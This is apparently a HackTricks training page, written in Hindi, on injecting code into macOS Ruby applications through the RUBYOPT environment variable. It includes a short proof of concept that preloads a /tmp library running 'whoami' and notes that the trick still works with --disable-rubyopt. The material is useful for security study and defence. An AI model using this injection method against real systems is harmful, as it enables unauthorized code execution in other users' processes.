# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

इस env variable का उपयोग करके **ruby** के execute होने पर हर बार उसमें **नए params** जोड़ना संभव है। हालांकि ruby code को execute करने के लिए param **`-e`** का उपयोग नहीं किया जा सकता, लेकिन libraries के load path में एक नया folder जोड़ने के लिए **`-I`** और **`-r`** params का उपयोग करना और फिर **load करने के लिए एक library specify करना** संभव है।

**`/tmp`** में library **`inject.rb`** बनाएं:
```ruby:inject.rb
puts `whoami`
```
कहीं भी इस तरह की ruby script बनाएं:
```ruby:hello.rb
puts 'Hello, World!'
```
फिर किसी मनमानी Ruby script से इसे load करें:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
मज़ेदार तथ्य, यह **`--disable-rubyopt`** param के साथ भी काम करता है:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
